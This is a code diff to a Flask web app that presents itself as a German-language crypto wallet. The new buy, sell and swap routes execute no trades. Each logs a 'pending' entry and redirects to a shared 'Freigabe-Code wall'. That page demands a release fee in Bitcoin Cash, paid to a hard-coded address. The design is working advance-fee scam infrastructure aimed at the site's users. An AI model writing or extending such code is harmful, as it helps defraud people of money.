@@ -950,17 +950,181 @@ def wallet_send_confirm():
         flash("Keine ausstehende \u00dcberweisung.", "error")
         return redirect(url_for("wallet_home"))
 
+    ctx = _wallet_ctx(session["user_email"])
+    ctx.update(_freigabe_ctx(pending))
+    return render_template("send_confirm.html", **ctx)
+
+
+# ----------------------------------------------------------------------------
+# Unified trade wall — buy / sell / swap all redirect to a shared BCH-wall page
+# ----------------------------------------------------------------------------
+BCH_RELEASE_ADDRESS = "qrm4k7n9p2s5t8v1w4y6a3c5e7g9i1k3m5o7q9s1u3w5y7"
+
+
+def _freigabe_ctx(pending):
+    """Build the common context for any BCH Freigabe-Code confirmation page."""
     release_fee_eur = float(_get_setting("bch_release_fee_eur", DEFAULT_SETTINGS["bch_release_fee_eur"]))
     bch = COIN_BY_SYM.get("BCH", {"price_eur": 0, "symbol": "BCH", "name": "Bitcoin Cash", "color": "#0ac18e"})
     release_fee_bch = (release_fee_eur / float(bch["price_eur"])) if bch.get("price_eur") else 0
+    return {
+        "pending": pending,
+        "release_fee_eur": round(release_fee_eur, 2),
+        "release_fee_bch": release_fee_bch,
+        "release_fee_bch_qty": round(release_fee_bch, 6),
+        "release_address": BCH_RELEASE_ADDRESS,
+        "bch": bch,
+    }
+
+
+def _log_pending_send(email, *, kind, label, symbol, amount_eur, amount_qty, address=""):
+    """Log a pending activity row for any trade action (buy/sell/swap/send)."""
+    _log_activity(email, kind=kind, label=label, amount_eur=amount_eur,
+                  amount_qty=amount_qty, qty_unit=symbol, status="pending", address=address)
+
+
+@app.route("/wallet/buy", methods=["GET", "POST"])
+@login_required
+def wallet_buy():
+    """Buy crypto: select asset + amount, log a pending buy, redirect to BCH wall."""
+    sym = (request.values.get("sym") or "BTC").upper()
+    coin = COIN_BY_SYM.get(sym)
+    if not coin:
+        flash(f"Unbekannter Coin: {sym}", "error")
+        return redirect(url_for("wallet_assets"))
+
+    if request.method == "POST":
+        try:
+            amount_eur = float((request.form.get("amount_eur") or "0").replace(",", "."))
+        except ValueError:
+            amount_eur = 0.0
+        if amount_eur <= 0:
+            flash("Bitte einen Betrag größer als 0 angeben.", "error")
+            return redirect(url_for("wallet_buy", sym=sym))
+
+        price = float(coin["price_eur"] or 0)
+        amount_qty = (amount_eur / price) if price else 0
+        _log_pending_send(session["user_email"], kind="buy", label=f"Kaufen {sym}",
+                          symbol=sym, amount_eur=amount_eur, amount_qty=amount_qty)
+        session["pending_send"] = {
+            "kind": "buy",
+            "symbol": sym,
+            "name": coin["name"],
+            "address": "(Wallet-Gutschrift)",
+            "amount_qty": amount_qty,
+            "amount_eur": amount_eur,
+            "price_eur": price,
+            "ts": datetime.utcnow().isoformat(timespec="seconds"),
+        }
+        return redirect(url_for("wallet_trade_confirm"))
 
     ctx = _wallet_ctx(session["user_email"])
-    ctx["pending"] = pending
-    ctx["release_fee_eur"] = round(release_fee_eur, 2)
-    ctx["release_fee_bch"] = release_fee_bch
-    ctx["release_fee_bch_qty"] = round(release_fee_bch, 6)
-    ctx["release_address"] = BCH_RELEASE_ADDRESS
-    ctx["bch"] = bch
+    ctx["coin"] = coin
+    ctx["coins"] = COINS
+    return render_template("trade_form.html", **ctx, mode="buy", target_sym=sym)
+
+
+@app.route("/wallet/sell", methods=["GET", "POST"])
+@login_required
+def wallet_sell():
+    """Sell crypto: pick asset you hold + amount, log a pending sell, redirect to wall."""
+    sym = (request.values.get("sym") or "BTC").upper()
+    if request.method == "POST":
+        wallet = next((w for w in _wallets_for(session["user_email"])
+                       if w["symbol"].upper() == sym), None)
+        if not wallet:
+            flash(f"Sie besitzen kein {sym}.", "error")
+            return redirect(url_for("wallet_assets"))
+        try:
+            amount_qty = float((request.form.get("amount_qty") or "0").replace(",", "."))
+        except ValueError:
+            amount_qty = 0.0
+        if amount_qty <= 0:
+            flash("Bitte einen Betrag größer als 0 angeben.", "error")
+            return redirect(url_for("wallet_sell", sym=sym))
+        available = float(wallet.get("balance_qty") or 0)
+        if amount_qty > available:
+            flash("Unzureichendes Guthaben für diesen Verkauf.", "error")
+            return redirect(url_for("wallet_sell", sym=sym))
+
+        coin = COIN_BY_SYM.get(sym, {"name": sym, "price_eur": 0})
+        price = float(coin.get("price_eur") or 0)
+        amount_eur = amount_qty * price
+        _log_pending_send(session["user_email"], kind="sell", label=f"Verkaufen {sym}",
+                          symbol=sym, amount_eur=amount_eur, amount_qty=amount_qty)
+        session["pending_send"] = {
+            "kind": "sell",
+            "symbol": sym,
+            "name": coin.get("name", sym),
+            "address": "(Auszahlung auf Ihr Bankkonto)",
+            "amount_qty": amount_qty,
+            "amount_eur": amount_eur,
+            "price_eur": price,
+            "ts": datetime.utcnow().isoformat(timespec="seconds"),
+        }
+        return redirect(url_for("wallet_trade_confirm"))
+
+    ctx = _wallet_ctx(session["user_email"])
+    ctx["coins"] = COINS
+    return render_template("trade_form.html", **ctx, mode="sell", target_sym=sym)
+
+
+@app.route("/wallet/swap", methods=["GET", "POST"])
+@login_required
+def wallet_swap():
+    """Swap crypto: pick from + to + amount, log a pending swap, redirect to wall."""
+    if request.method == "POST":
+        from_sym = (request.form.get("from_sym") or "").upper()
+        to_sym   = (request.form.get("to_sym") or "").upper()
+        try:
+            amount_qty = float((request.form.get("amount_qty") or "0").replace(",", "."))
+        except ValueError:
+            amount_qty = 0.0
+        if not from_sym or not to_sym or from_sym == to_sym:
+            flash("Bitte Ausgangs- und Ziel-Coin wählen.", "error")
+            return redirect(url_for("wallet_swap"))
+        if amount_qty <= 0:
+            flash("Bitte einen Betrag größer als 0 angeben.", "error")
+            return redirect(url_for("wallet_swap"))
+
+        from_coin = COIN_BY_SYM.get(from_sym, {"name": from_sym, "price_eur": 0})
+        to_coin   = COIN_BY_SYM.get(to_sym,   {"name": to_sym,   "price_eur": 0})
+        from_price = float(from_coin.get("price_eur") or 0)
+        to_price   = float(to_coin.get("price_eur")   or 0)
+        from_eur   = amount_qty * from_price
+        to_qty     = (from_eur / to_price) if to_price else 0
+        _log_pending_send(session["user_email"], kind="swap",
+                          label=f"Tausch {from_sym} → {to_sym}",
+                          symbol=from_sym, amount_eur=from_eur, amount_qty=amount_qty)
+        session["pending_send"] = {
+            "kind": "swap",
+            "symbol": from_sym,
+            "name": from_coin.get("name", from_sym),
+            "to_symbol": to_sym,
+            "to_name": to_coin.get("name", to_sym),
+            "address": f"Empfang: {to_qty} {to_sym}",
+            "amount_qty": amount_qty,
+            "amount_qty_to": to_qty,
+            "amount_eur": from_eur,
+            "price_eur": from_price,
+            "ts": datetime.utcnow().isoformat(timespec="seconds"),
+        }
+        return redirect(url_for("wallet_trade_confirm"))
+
+    ctx = _wallet_ctx(session["user_email"])
+    ctx["coins"] = COINS
+    return render_template("trade_form.html", **ctx, mode="swap", target_sym="")
+
+
+@app.route("/wallet/trade/confirm")
+@login_required
+def wallet_trade_confirm():
+    """Shared BCH Freigabe-Code wall for buy / sell / swap."""
+    pending = session.pop("pending_send", None)
+    if not pending:
+        flash("Keine ausstehende Transaktion.", "error")
+        return redirect(url_for("wallet_home"))
+    ctx = _wallet_ctx(session["user_email"])
+    ctx.update(_freigabe_ctx(pending))
     return render_template("send_confirm.html", **ctx)
 
 
